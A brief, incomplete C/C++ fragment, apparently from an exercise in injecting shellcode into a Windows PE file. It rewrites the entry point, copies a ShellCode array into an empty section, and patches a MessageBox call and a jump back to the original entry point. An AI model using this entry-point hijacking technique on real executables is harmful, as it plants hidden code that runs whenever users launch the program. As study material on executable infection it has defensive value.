...
//    EmptyAddrEnd = (unsigned char *)((unsigned char *)StrBuffer + EmptySectionEnd + 0xfff);
    ...
    // 注入
    jmp_to_home = *OEP - VirtualCodeStart - 18;
    msgbox = file.getfunaddr();
    call_msgbox = msgbox - 0x400000 - VirtualCodeStart - 0xd;

    memcpy((unsigned char *)StrBuffer + choicepe + 0x10,&VirtualCodeStart,4);
    memcpy((unsigned char *)StrBuffer + CodeStart,ShellCode,sizeof(ShellCode));
    memcpy((unsigned char *)StrBuffer + CodeStart + 9,&call_msgbox,4);
    memcpy((unsigned char *)StrBuffer + CodeStart + 0xe,&jmp_to_home,4);
